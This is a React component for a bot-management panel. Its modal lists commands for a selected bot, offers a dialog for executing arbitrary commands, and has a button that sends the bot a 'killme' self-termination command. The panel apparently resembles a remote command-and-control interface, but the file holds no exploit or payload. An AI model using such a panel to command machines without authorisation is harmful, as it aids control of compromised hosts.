import React, {useState} from "react";
import {Button, Modal} from "antd";
import {ModalsProps} from "../../../Model/Modal";
import CommandsList from "../../Misc/Commands";
import {Bot} from "../../../Model/Bot";
import {useTranslation} from "react-i18next";
import sendCommand from "../../../Requests/Commands/sendCommands";
import CustomCommand from "../CustomCommand/CustomCommand";

interface CommandsModalProps extends ModalsProps {
    bot: Bot,
}

const CommandsModal: React.FC<CommandsModalProps> = (props: CommandsModalProps) => {
    const {t} = useTranslation();
    const [showExecute, setShowExecute] = useState(false);

    return (
        <>
            <Modal
                title={(
                    <>
                        <i className="fa-solid fa-terminal" /> {t("COMMANDS")}
                    </>
                )}
                open={props.visible}
                onCancel={() => props.setVisible(false)}
                className="commands-modal"
                footer={(
                    <>
                        <Button
                            onClick={() => setShowExecute(true)}
                            icon={(
                                <span className="anticon">
                                    <i className="fa-solid fa-terminal" />
                                </span>
                            )}
                        >
                            {t("EXECUTE_FREE_COMMAND")}
                        </Button>
                        <Button
                            type="primary"
                            icon={(
                                <span className="anticon">
                                    <i className="fa-solid fa-skull" style={{transform: "translateY(-2px)"}} />
                                </span>
                            )}
                            onClick={() => {
                                Modal.confirm({
                                    title: t("KILL_ME_COMMAND") + "?",
                                    content: t("UNDONE_ACTION"),
                                    icon: (
                                        <span className="anticon">
                                            <i className="fa-solid fa-skull" style={{color: "#a61d24"}} />
                                        </span>
                                    ),
                                    closable: true,
                                    onOk: () => {
                                        sendCommand({
                                            command: "killme",
                                            payload: [],
                                            botIds: [props.bot.id],
                                        });
                                    },
                                    okButtonProps: {
                                        danger: true,
                                        // disabled: killBot,
                                    },
                                    okText: t("KILL_ME_COMMAND"),
                                    cancelText: t("MODAL_BUTTON_CANCEL"),
                                });
                            }}
                            danger
                        >
                            {t("KILL_ME_COMMAND")}
                        </Button>
                        <Button type="primary" onClick={() => props.setVisible(false)}>
                            {t("CLOSE")}
                        </Button>
                    </>
                )}
                width={800}
                destroyOnClose
            >
                <CommandsList selectedBots={[props.bot]} />
            </Modal>

            {showExecute && (
                <CustomCommand
                    bot={props.bot}
                    visible={showExecute}
                    setVisible={setShowExecute}
                />
            )}
        </>
    );
};

export default CommandsModal;
